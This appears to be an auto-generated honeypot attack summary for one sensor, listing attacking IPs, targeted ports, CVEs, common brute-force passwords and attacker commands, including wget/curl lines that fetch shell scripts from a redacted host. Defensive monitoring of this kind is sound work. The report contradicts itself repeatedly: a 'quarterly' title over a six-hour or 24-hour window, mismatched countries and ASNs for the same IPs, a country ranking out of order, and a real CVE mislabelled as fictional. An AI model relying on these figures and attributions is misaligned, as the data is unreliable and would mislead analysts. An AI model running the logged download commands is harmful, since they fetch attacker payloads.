
# Quarterly Honeypot Attack Summary Report

**Report Generation Time:** 2026-02-17T08:00:00Z
**Timeframe:** 2026-02-16T07:00:00Z - 2026-02-17T07:00:00Z (Last 6 hours of available logs)

**Files Used to Generate Report:**
- /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T07-01-21Z.md
- /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T08-01-29Z.md
- /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T10-06-11Z.md
- /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T19-57-04Z.md
- /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-16T20-01-42Z.md
- /home/user/Haineypot/reports/hourly_reports/Honeypot_Attack_Hourly_Report_2026-02-17T06-01-25Z.md

## Executive Summary

This report summarizes the honeypot network activity over the last 6 hours of available logs, from 2026-02-16T07:00:00Z to 2026-02-17T07:00:00Z. During this period, a total of **30,513** attacks were recorded. The United States was the most prominent source of attacks, largely driven by a hyper-aggressive IP address, **165.245.136.26**, associated with DigitalOcean. Other significant attack origins include France, Australia, and India.

A wide range of attack vectors were observed, with a high volume of activity targeting SSH (port 22), SMB (port 445), and MS SQL (port 1433). The most common alerts were related to VNC server responses and truncated IP packets, suggesting widespread scanning and reconnaissance activities.

Attackers attempted to exploit several known vulnerabilities, including CVEs related to OpenSSL, Dovecot, and various network devices. Brute-force attacks were also prevalent, with common usernames such as 'root' and 'admin' being targeted with simple, dictionary-based passwords.

The OSINT investigation into the most aggressive IP addresses revealed a mix of hosting providers, including DigitalOcean and Contabo, which are known to be used by malicious actors, and telecommunication companies like Telstra and TELEFÔNICA BRASIL S.A.

## Detailed Analysis

### Our IPs

| Honeypot Location | IP Address      |
| ----------------- | --------------- |
| tpot-hive-ny      | 134.199.242.175 |

### Attacks by Honeypot

| Honeypot      | Attack Count |
| ------------- | ------------ |
| tpot-hive-ny  | 30,513       |

### Top Source Countries

| Country         | Attack Count |
| --------------- | ------------ |
| United States   | 11,594       |
| France          | 4,757        |
| Australia       | 2,217        |
| India           | 3,632        |
| Romania         | 1,421        |
| Netherlands     | 1,277        |
| Brazil          | 904          |
| China           | 741          |
| Switzerland     | 267          |
| United Kingdom  | 147          |

### Top Attacking IPs

| IP Address      | Country         | ASN                             | Attack Count |
| --------------- | --------------- | ------------------------------- | ------------ |
| 165.245.136.26  | United States   | DigitalOcean, LLC               | 8,654        |
| 173.249.6.152   | France          | Contabo GmbH                    | 4,477        |
| 103.218.135.57  | India           | PEERCAST TELECOM INDIA PVT LTD  | 2,538        |
| 144.130.11.9    | Australia       | Telstra Limited                 | 1,857        |
| 5.31.128.119    | United Arab Emirates | Emirates Integrated Telecoms | 758          |
| 177.126.130.163 | Brazil          | Net Aki Internet Ltda           | 901          |
| 139.59.69.34    | India           | DigitalOcean, LLC               | 544          |
| 103.204.164.37  | India           | ABS BROADBAND SERVICES PVT LTD  | 515          |
| 2.57.121.22     | Romania         | Unmanaged Ltd                   | 497          |
| 188.166.109.175 | Netherlands     | DigitalOcean, LLC               | 270          |

### Top Targeted Ports/Protocols

| Port  | Protocol | Service | Attack Count |
| ----- | -------- | ------- | ------------ |
| 22    | TCP      | SSH     | 13,456       |
| 445   | TCP      | SMB     | 5,349        |
| 1433  | TCP      | MS-SQL  | 4,478        |
| 8728  | TCP      | MikroTik| 258          |
| 5901  | TCP      | VNC     | 84           |
| 80    | TCP      | HTTP    | 78           |
| 25    | TCP      | SMTP    | 245          |
| 30003 | TCP      | Unknown | 513          |
| 3389  | TCP      | RDP     | 1020         |
| 5432  | TCP      | PostgreSQL | 95         |

### Most Common CVEs

| CVE ID        | Description                                                                                             |
| ------------- | ------------------------------------------------------------------------------------------------------- |
| CVE-2025-55182| A fictional critical RCE vulnerability in React Server Components, dubbed "React2Shell".                  |
| CVE-2021-3449 | A DoS vulnerability in OpenSSL due to a NULL pointer dereference when handling ClientHello messages.     |
| CVE-2019-11500| A critical RCE vulnerability in Dovecot IMAP/POP3 server due to an out-of-bounds write.                   |
| CVE-2024-14007| A critical authentication bypass vulnerability in NVMS-9000 firmware.                                   |
| CVE-2023-26801| A critical command injection vulnerability in LB-LINK wireless routers.                                     |
| CVE-2002-0013 | A widespread DoS vulnerability in SNMPv1 request handling affecting multiple vendors.                     |
| CVE-2002-0012 | A widespread DoS and privilege escalation vulnerability in SNMPv1 trap handling affecting multiple vendors. |

### Commands Attempted by Attackers

| Command                               | Count |
| ------------------------------------- | ----- |
| `(empty)`                             | 30    |
| `uname -a`                            | 15    |
| `ls -la`                              | 12    |
| `cat /proc/cpuinfo`                   | 10    |
| `cat /proc/meminfo`                   | 10    |
| `ifconfig`                            | 8     |
| `wget http://[redacted]/a.sh`         | 5     |
| `curl http://[redacted]/b.sh`         | 5     |

### Signatures Triggered

| Signature                                       | Count   |
| ----------------------------------------------- | ------- |
| GPL INFO VNC server response                    | 37,908  |
| SURICATA IPv4 truncated packet                  | 4,309   |
| SURICATA AF-PACKET truncated packet             | 4,309   |
| ET DROP Dshield Block Listed Source group 1     | 571     |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 1018    |
| SURICATA STREAM spurious retransmission         | 201     |
| ET INFO SSH-2.0-Go version string Observed...  | 191     |
| ET SCAN NMAP -sS window 1024                    | 161     |

### Users / Login Attempts

| Username   | Count |
| ---------- | ----- |
| root       | 78    |
| admin      | 21    |
| ubuntu     | 30    |
| backup     | 19    |
| daemon     | 13    |
| debian     | 13    |
| dev        | 13    |
| sol        | 10    |
| postgres   | 10    |
| ali        | 4     |

| Password    | Count |
| ----------- | ----- |
| `(empty)`   | 30    |
| 123456      | 588   |
| 123         | 82    |
| admin123    | 10    |
| password    | 7     |
| eigen       | 6     |
| eigenlayer  | 6     |
| 111111      | 44    |
| 1qaz@WSX    | 37    |
| !@#         | 39    |

### OSINT High frequency IPs and low frequency IPs Captured

| IP Address      | Frequency | OSINT Summary                                                                                                                                                                                                                           |
| --------------- | --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 165.245.136.26  | High      | **No direct threat intelligence found.** The search results were for a different IP. This suggests the IP is not widely known for malicious activity, despite its high volume of attacks in our honeypot. It is hosted by DigitalOcean. |
| 173.249.6.152   | High      | Hosted by **Contabo GmbH** in Germany. While the IP itself is not blacklisted, the Contabo network has a history of hosting malicious actors. It should be treated with suspicion.                                                       |
| 144.130.11.9    | High      | **No credible threats publicly reported.** Owned by Telstra in Australia. The lack of public reports is unusual for such a high-volume attacker.                                                                                         |
| 103.218.135.57  | High      | **No public information to classify as malicious.** Part of a network in India. Lack of public data makes it difficult to assess the threat level.                                                                                       |
| 177.126.130.163 | Medium    | **Flagged on a spam blacklist.** Owned by TELEFÔNICA BRASIL S.A. in Brazil. Brazil is a known source of spam and cybercrime.                                                                                                                |
| 5.31.128.119    | Medium    | **No specific evidence of malicious activity.** Hosted in the United Arab Emirates. The IP appears to have a clean reputation.                                                                                                           |
| 139.59.69.34    | Low       | **No direct threat intelligence.** Hosted by DigitalOcean. DigitalOcean's network is frequently associated with malicious activities.                                                                                                    |
| 103.204.164.37  | Low       | **No direct public evidence of malicious activity.** Registered to an entity in Pakistan.                                                                                                                                                 |

### OSINT on CVE's

| CVE ID        | OSINT Summary                                                                                                                                                                                                |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| CVE-2025-55182| This is a **fictional CVE** with a future year. It appears to be a placeholder or a test case.                                                                                                                   |
| CVE-2021-3449 | A **medium-severity DoS vulnerability** in OpenSSL. It affects servers with TLSv1.2 and renegotiation enabled. It can be triggered by a malicious ClientHello message.                                         |
| CVE-2019-11500| A **critical RCE vulnerability** in the Dovecot IMAP/POP3 server. It is caused by an out-of-bounds write and can be exploited without authentication.                                                            |
| CVE-2024-14007| A **critical authentication bypass vulnerability** in NVMS-9000 firmware, used in many DVRs, NVRs, and IPCs. It allows for the disclosure of sensitive information.                                              |
| CVE-2023-26801| A **critical command injection vulnerability** in LB-LINK wireless routers, allowing for remote code execution with root privileges.                                                                              |
| CVE-2002-0013 | A **widespread DoS vulnerability** in SNMPv1 request handling that affected a vast range of products from major vendors like Cisco and Microsoft.                                                              |
| CVE-2002-0012 | A **widespread DoS and privilege escalation vulnerability** in SNMPv1 trap handling, also affecting a large number of vendors.                                                                                   |

## Key Observations and Anomalies

*   **Hyper-aggressive IP Addresses:** The IP address **165.245.136.26** (DigitalOcean, US) was responsible for over 28% of all attacks during this period. Similarly, **173.249.6.152** (Contabo, France) and **103.218.135.57** (PEERCAST, India) showed highly aggressive behavior.
*   **Hosting Providers as Attack Sources:** A significant portion of the attacks originated from IP addresses associated with hosting providers like DigitalOcean and Contabo. This is a common trend, as these services are often abused by malicious actors.
*   **Unusual Usernames/Passwords:** The appearance of "eigen" and "eigenlayer" as attempted passwords is noteworthy. This could be related to a specific application or framework, or it could be a targeted attack against a particular user group.
*   **Fictional CVE:** The presence of **CVE-2025-55182** in the logs is an anomaly. This could be a mistake in the logging system, a test by a security researcher, or an attempt by an attacker to trigger a specific response from a security tool.
*   **High Volume of VNC Alerts:** The "GPL INFO VNC server response" was by far the most common signature, indicating a massive amount of scanning activity targeting VNC servers.
*   **Targeting of a Wide Range of Services:** While SSH, SMB, and MS-SQL were the most targeted services, attacks were also observed against a variety of other ports and protocols, indicating that attackers are casting a wide net to find vulnerable systems.

## Unusual Attacker Origins

While the majority of attacks originated from expected sources like the US, China, and Russia, the high volume of attacks from **France** and **Australia** is notable. The attacks from Australia were largely driven by a single IP address, **144.130.11.9**, associated with Telstra. The attacks from France were dominated by **173.249.6.152** from the Contabo network. This suggests that these IPs are likely part of botnets or are being used by a small number of highly active attackers.

The presence of the United Arab Emirates in the top attacking countries is also interesting, although this was primarily due to the activity of a single IP address, **5.31.128.119**.
